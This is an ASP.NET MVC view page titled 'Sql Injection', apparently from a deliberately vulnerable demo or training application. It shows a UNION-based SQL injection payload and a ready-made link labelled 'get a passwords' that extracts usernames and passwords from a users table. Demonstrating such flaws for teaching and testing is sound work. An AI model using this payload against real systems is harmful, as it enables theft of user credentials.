<%@ Page Title="" Language="C#" MasterPageFile="~/Views/Shared/Master.Master" Inherits="System.Web.Mvc.ViewPage<dynamic>" %>

<asp:Content ID="Content1" ContentPlaceHolderID="Content" runat="server">
    <h2>
        Sql Injection</h2>
    <h2>
        HERE: the the query parameter I' UNION select PASSWORD,username,NULL, NULL,null
        from users --''
    </h2>
    <a href="/Home/Detail/?id=I'%20UNION%20select%20PASSWORD,username,NULL,%20NULL,null%20from%20users%20--">
        get a passwords</a>
</asp:Content>
